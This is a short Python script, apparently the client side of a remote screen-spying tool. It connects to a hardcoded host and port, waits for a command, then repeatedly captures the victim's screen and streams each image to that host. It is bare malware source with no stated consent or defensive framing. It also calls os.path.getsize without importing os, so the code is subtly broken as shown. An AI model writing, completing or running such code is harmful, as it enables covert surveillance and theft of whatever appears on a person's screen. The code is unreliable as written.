from socket import *
from PIL import ImageGrab

s = socket()
s.connect(('172.20.10.2',8888))

choice = s.recv(1024).decode()

if choice == '1':
    while True:
        image = ImageGrab.grab()
        image = image.resize((960,540))
        image.save('monitor.jpg')

        size = os.path.getsize('monitor.jpg')
        s.send(str(size).encode())
        s.recv(1024)

        with open('monitor.jpg','rb') as file:
            for line in file:
                s.send(line)



